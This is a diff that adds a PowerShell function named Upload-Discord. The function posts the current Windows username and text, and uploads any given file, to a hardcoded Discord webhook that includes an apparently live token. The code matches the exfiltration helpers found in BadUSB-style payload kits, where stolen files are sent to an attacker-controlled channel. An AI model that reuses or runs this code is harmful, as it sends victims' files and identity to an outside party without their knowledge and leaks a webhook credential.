@@ -1,0 +1,20 @@
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+ [parameter(Position=0,Mandatory=$False)]
+ [string]$file,
+ [parameter(Position=1,Mandatory=$False)]
+ [string]$text
+)
+
+$hookurl = 'https://discordapp.com/api/webhooks/1185788833019727963/lIUpJv_S6fFHODWij0HSzbcRQEVTmb-0LC_zSHu0HR5wnPozOG30PpCPDBokup9F4EtZ'
+
+$Body = @{
+   'username' = $env:username
+   'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
